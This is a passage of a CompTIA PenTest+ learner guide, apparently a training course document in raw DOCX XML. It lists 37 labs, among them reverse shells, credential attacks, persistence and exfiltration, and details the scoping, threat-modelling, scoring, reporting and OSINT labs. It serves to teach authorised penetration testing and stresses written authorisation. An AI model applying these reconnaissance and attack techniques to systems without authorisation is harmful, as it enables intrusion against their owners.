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PenTest+ (PT0-003)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TGS-2024044563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CompTIA PenTest+ (PT0-003) Learner Guide covering all 35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Lab 12 (Wireshark/tcpdump traffic analysis) and Lab 21 (Netcat/Socat shells) — now 37 labs; added an Exam Focus section on testing frameworks, scan types (SAST/DAST/IAST/SCA) and specialized systems (mobile/IoT/OT/AI) for full PT0-003 domain alignment.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Engagement Management  (13%)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Scoping a Pentest: SoW, NDA and Rules of Engagement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Threat Modeling with STRIDE and DREAD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Mapping a Pentest to MITRE ATT&amp;CK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Risk Scoring with CVSS, CWE and EPSS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Writing a Penetration Test Report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Reconnaissance and Enumeration  (21%)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Passive OSINT with theHarvester and Recon-ng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WHOIS, DNS Recon and Zone Walking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Subdomain Enumeration with Amass and Subfinder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Shodan, Censys and Certificate Transparency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Network Scanning with Nmap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Service Enumeration with Nmap NSE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Traffic Capture and Analysis with Wireshark and tcpdump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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Recon Scripting with Bash and Python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Vulnerability Discovery and Analysis  (17%)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Vulnerability Scanning with Greenbone / OpenVAS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Web Vulnerability Scanning with Nikto and ZAP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17 — Container Image Scanning with Trivy and Grype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18 — Secrets Scanning with TruffleHog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19 — Validating Findings and Public Exploit Selection</w:t>
        <w:tab/>
        <w:t>25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Attacks and Exploits  (35%)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20 — Exploitation with the Metasploit Framework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21 — Bind and Reverse Shells with Netcat and Socat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22 — LLMNR/NBT-NS Poisoning and SMB Relay with Responder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23 — Online Password Attacks with Hydra and Medusa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24 — Offline Hash Cracking with hashcat and John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25 — Linux Privilege Escalation with LinPEAS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26 — Windows Privilege Escalation and Kerberoasting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27 — SQL Injection with sqlmap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28 — XSS, CSRF and SSRF with Burp Suite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29 — File Inclusion, Directory Traversal and Web Shells</w:t>
        <w:tab/>
        <w:t>36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30 — Cloud Attacks: S3 and IAM with Pacu and ScoutSuite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31 — Wireless Attacks: WPA Cracking with Aircrack-ng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32 — Social Engineering with GoPhish and SET</w:t>
        <w:tab/>
        <w:t>39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Post-exploitation and Lateral Movement  (14%)</w:t>
        <w:tab/>
        <w:t>40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33 — Establishing Persistence (cron, systemd, web shell)</w:t>
        <w:tab/>
        <w:t>41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34 — Lateral Movement with CrackMapExec and Impacket</w:t>
        <w:tab/>
        <w:t>42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35 — Pivoting with sshuttle, Chisel and Proxychains</w:t>
        <w:tab/>
        <w:t>43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36 — Data Exfiltration over DNS, ICMP and HTTPS</w:t>
        <w:tab/>
        <w:t>44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37 — Cleanup, Restoration and Artifact Preservation</w:t>
        <w:tab/>
        <w:t>45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Exam Focus — Testing Frameworks, Scan Types and Specialized Systems</w:t>
        <w:tab/>
        <w:t>46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Exam Preparation</w:t>
        <w:tab/>
        <w:t>48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48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CompTIA PenTest+ (PT0-003) (TGS-2024044563), conducted by Tertiary Infotech Academy Pte Ltd. It provides step-by-step instructions for all 37 hands-on labs, organised by the five official PT0-003 exam domains. Every lab maps to a published exam objective and is completed on Kali Linux using industry-standard, free penetration-testing tools.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Use this guide alongside the course slides and the lab files in the labs/ folder of the course repository. All offensive techniques must only be run against systems you own or have written authorisation to test — unauthorised access to a computer is a criminal offence under the Singapore Computer Misuse Act and equivalents elsewhere. Always complete the clean-up and artifact-preservation steps at the end of an engagement.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Plan and scope a penetration test — pre-engagement activities, SoW/NDA/RoE, threat modelling, MITRE ATT&amp;CK mapping, CVSS risk scoring and professional reporting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LO2: Perform reconnaissance and enumeration — passive OSINT, DNS and subdomain discovery, internet-exposure intelligence, and active network, service and web enumeration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LO3: Discover and analyse vulnerabilities — network, web, container and secrets scanning, then validate findings and select public exploits safely.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LO4: Execute attacks and exploits — network, authentication, application, wireless, cloud and social-engineering attacks against authorised targets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LO5: Conduct post-exploitation and lateral movement — persistence, credential-based lateral movement, pivoting, exfiltration testing, and cleanup with artifact preservation.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Kali Linux environment — the Killercoda Kali playground (browser-based), a Kali VM in VirtualBox/VMware, Kali in WSL2, or the Kali Docker image.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Most tools are pre-installed in Kali; install anything missing with apt (e.g. sudo apt install -y &lt;tool&gt;).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerable practice targets launched as Docker containers on the Kali host: DVWA, OWASP Juice Shop and Metasploitable3; plus AWS Free Tier / localstack for the cloud lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Written authorisation (a signed Rules of Engagement) for any target that is not your own lab machine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Launch and verify Kali Linux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Kali Linux ships with the offensive-security toolchain pre-installed (Nmap, Metasploit, Burp Suite, hashcat, Aircrack-ng and hundreds more). Start your Kali environment, open a terminal, become root when a step needs it, and confirm the core tools are present before you begin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>kali@kali:~$ id                 # confirm your user</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>kali@kali:~$ nmap --version      # core scanner present</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>kali@kali:~$ msfconsole --version # Metasploit present</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>kali@kali:~$ sudo apt update      # refresh package lists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Commands are run from a Kali terminal; a leading sudo is used where root is required.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Placeholders such as &lt;TARGET&gt;, &lt;KALI&gt; and &lt;ip&gt; are replaced with your own lab addresses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Each lab creates a working directory under ~/engagements/ for its notes, output and loot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reset or re-deploy a vulnerable target between exploit labs that change its state.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Run the clean-up step at the end of state-changing labs, and preserve artifacts for the report.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Topic 01 — Engagement Management  (13%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Pre-engagement · SoW / NDA / RoE · Threat Modelling · MITRE ATT&amp;CK · CVSS · Reporting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penetration test is an authorised, scoped simulated attack; the signed Rules of Engagement (RoE) and authorisation letter are what make it legal, not a crime.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pre-engagement defines scope with three documents: the NDA (confidentiality), the Statement of Work (targets, methodology, schedule, fees) and the Rules of Engagement (windows, allowed/forbidden actions, stop conditions).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Threat modelling (STRIDE, DREAD) and MITRE ATT&amp;CK give a structured, adversary-realistic view of what to test and how findings map to real tactics and techniques.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Findings are prioritised with CVSS base/temporal scores, CWE weakness types and EPSS exploit-likelihood, then communicated in a report with an executive summary and remediation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 1 — Scoping a Pentest: SoW, NDA and Rules of Engagement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Summarize pre-engagement activities.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner reads a vague client brief, extracts the four scoping pillars, and drafts the three foundational pre-engagement documents (NDA, SoW, RoE) before self-checking against PTES.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>An NDA, a scoped Statement of Work, and a Rules of Engagement brief   (Tools: NDA, SoW, RoE, PTES, OWASP WSTG, OWASP API Security Top 10.)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client brief and identify targets, exclusions, cases, window</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create the engagement working directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mkdir -p ~/engagements/acme &amp;&amp; cd ~/engagements/acme</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Draft the Non-Disclosure Agreement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nano nda.md</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Draft the Statement of Work with in-scope targets and schedule</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nano sow.md</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Draft the Rules of Engagement with authorised testers and windows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nano roe.md</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>List allowed and forbidden activities plus stop conditions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Self-check the three documents against the PTES pre-engagement list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the three documents together cover every PTES pre-engagement item: scope, schedule, IP whitelist, emergency contacts, payment, NDA, and signed authorisation.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labs/lab-01-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 2 — Threat Modeling with STRIDE and DREAD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Compare and contrast testing frameworks and methodologies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner draws a data-flow diagram of a login application, enumerates threats per element with STRIDE, scores them with DREAD, and versions the exported model in the engagement Git repo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A data-flow diagram, a STRIDE threat table, and a DREAD-scored triage queue   (Tools: STRIDE, DREAD, OWASP Threat Dragon, PTES, OWASP Top 10, MITRE ATT&amp;CK, Git.)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Draw the data-flow diagram with trust boundaries in Threat Dragon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate threats per element using the six STRIDE categories</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Score at least five threats across the five DREAD dimensions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Flag any threat averaging 7 or above as High</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Note where STRIDE, DREAD, PTES, OWASP and ATT&amp;CK each fit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Export the Threat Dragon model to JSON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cp ~/Downloads/acme-login-threatmodel.json ~/engagements/acme/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Commit the threat model to the engagement Git repo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cd ~/engagements/acme &amp;&amp; git init &amp;&amp; git add . &amp;&amp; git commit -m 'Initial threat model'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the DFD, the STRIDE table and a DREAD triage queue exist, and the exported JSON model is committed alongside the SoW.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labs/lab-02-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 3 — Mapping a Pentest to MITRE ATT&amp;CK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Compare and contrast testing frameworks and methodologies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner uses the MITRE ATT&amp;CK Navigator to map a phishing-to-exfiltration kill chain to Tactic, Technique and Sub-technique IDs, then scores, colours and exports the layer with detections and mitigations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A scored, colour-coded ATT&amp;CK Navigator layer exported as SVG and JSON   (Tools: MITRE ATT&amp;CK Navigator, Cyber Kill Chain, OWASP Top 10, PTES, NIST SP 800-115.)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a new Enterprise layer in ATT&amp;CK Navigator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Map the kill chain to Tactic, Technique and Sub-technique IDs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Add selected techniques to the layer with a score of 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Set a colour gradient and score each technique to build the heatmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Export the layer to SVG for the report and JSON for the folder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Open a technique cell to review detections and mitigations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Copy a technique's mitigation list into the draft Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the kill chain is mapped to correct ATT&amp;CK IDs and a scored, coloured layer is exported as both SVG and JSON with mitigations captured.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labs/lab-03-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 4 — Risk Scoring with CVSS, CWE and EPSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Analyze findings and prioritize attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner looks up three real CVEs, re-derives their CVSS v3.1 base scores from the vector strings, and builds a prioritised remediation table combining CVSS, CWE, EPSS and CISA KEV.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A CVSS/CWE/EPSS/KEV prioritisation table and a written remediation recommendation   (Tools: CVSS v3.1, CWE, EPSS, CISA KEV, NVD, FIRST CVSS calculator.)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the NVD, CVSS 3.1, EPSS and CWE web tools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Score CVE-2024-3094 and translate its CVSS vector string</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Score CVE-2017-0144 (EternalBlue) and note its CISA KEV status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Score CVE-2014-6271 (Shellshock) with CWE and EPSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Build the ranked prioritisation table across CVSS, EPSS, KEV, CWE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Apply the CVSS/EPSS/KEV rules of thumb to set fix urgency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Write the Shellshock finding as a remediation with compensating control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm each CVSS vector re-derives to the published base score and the ranked table justifies fix urgency using CVSS, EPSS and CISA KEV together.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labs/lab-04-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 5 — Writing a Penetration Test Report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Assemble report components and communicate findings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner writes a deliverable-grade Markdown pentest report with all standard sections, converts it to PDF and DOCX with pandoc, trials Dradis CE for team reporting, and runs a peer-review checklist.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A delivery-grade pentest report in Markdown, PDF and DOCX   (Tools: pandoc, texlive-xetex, Dradis CE, PTES, OWASP WSTG, CVSS, MITRE ATT&amp;CK.)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pandoc and the LaTeX PDF engine</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt install -y pandoc texlive-xetex</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create the report skeleton in the report directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mkdir -p ~/engagements/acme/report &amp;&amp; cd ~/engagements/acme/report &amp;&amp; nano report.md</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Write exec summary, methodology, scope and limitations sections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Write detailed findings with CVSS, CWE, ATT&amp;CK, impact and fix</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Convert the Markdown report to a delivery-grade PDF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>pandoc report.md -o report.pdf --pdf-engine=xelatex -V geometry:margin=2cm -V mainfont='DejaVu Sans'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Convert the report to DOCX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>pandoc report.md -o report.docx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Trial Dradis CE for collaborative team reporting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>docker run --rm -p 3000:3000 dradis/dradis-ce:latest</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Walk through the peer-review and secure-distribution checklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm the report renders to a delivery-grade PDF and DOCX with all PT0-003 sections and passes the peer-review, business-risk and secure-distribution checklist gates.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labs/lab-05-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Topic 02 — Reconnaissance and Enumeration  (21%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OSINT · WHOIS &amp; DNS · Subdomains · Shodan/Censys · Nmap · NSE · Web Enum · Scripting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Passive reconnaissance gathers intelligence without touching the target (OSINT, WHOIS, DNS, certificate transparency, Shodan/Censys); active reconnaissance probes it directly (scanning, enumeration).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS and subdomain enumeration (theHarvester, Amass, Subfinder, zone transfers) expand the attack surface from one domain to many hosts and services.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nmap discovers live hosts, open ports and service versions; the Nmap Scripting Engine (NSE) enumerates services and detects known issues.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Web enumeration (Gobuster, Wfuzz, WhatWeb) and lightweight Bash/Python scripting turn raw recon into a structured, repeatable target list.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 6 — Passive OSINT with theHarvester and Recon-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Apply information-gathering techniques; tools for recon and enumeration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner collects emails, subdomains and IPs from public sources with theHarvester, chains free Recon-ng modules in a workspace, and exports an HTML OSINT report without touching the target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>An emails/hosts/IPs OSINT dataset and an exported HTML recon report   (Tools: theHarvester, Recon-ng, crt.sh, passive DNS, Firefox.)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theHarvester and Recon-ng on Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt install -y theharvester recon-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Gather emails and hosts with theHarvester</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>theHarvester -d example.com -b duckduckgo,crtsh,hackertarget,rapiddns -l 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
